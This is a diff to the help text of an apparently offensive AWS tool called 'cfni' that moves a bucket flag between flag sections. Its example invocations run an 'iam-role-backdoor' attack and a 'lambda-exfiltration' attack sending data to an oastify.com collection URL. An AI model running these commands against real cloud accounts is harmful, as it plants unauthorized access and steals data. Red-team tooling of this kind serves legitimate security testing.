@@ -30,6 +30,7 @@ Examples:
 cfni iam-role-backdoor --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX
 
 Flags:
+  -b, --bucket string                 bucket name (required)  
       --environment strings           filter environments (default all environments)
   -h, --help                          help for iam-role-backdoor
       --logical-id string             logical id of the backdoor role (default "MaintenanceRoleBF21E41F")
@@ -44,7 +45,6 @@ Flags:
 Global Flags:
       --attacker-profile string   attacker AWS profile
       --attacker-region string    attacker AWS region
-  -b, --bucket string             bucket name (required)
       --bucket-profile string     bucket AWS profile
   -A, --user-agent string         user-agent to use for sdk calls (default "cfni")
 ```
@@ -60,6 +60,7 @@ Examples:
 cfni lambda-exfiltration --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX --url https://xxxyem3.oastify.com
 
 Flags:
+  -b, --bucket string                 bucket name (required)
       --environment strings           filter environments (default all environments)
   -h, --help                          help for lambda-exfiltration
       --s3-access-key-id string       s3 access key id
@@ -72,7 +73,6 @@ Flags:
 Global Flags:
       --attacker-profile string   attacker AWS profile
       --attacker-region string    attacker AWS region
-  -b, --bucket string             bucket name (required)
       --bucket-profile string     bucket AWS profile
   -A, --user-agent string         user-agent to use for sdk calls (default "cfni")
 ```
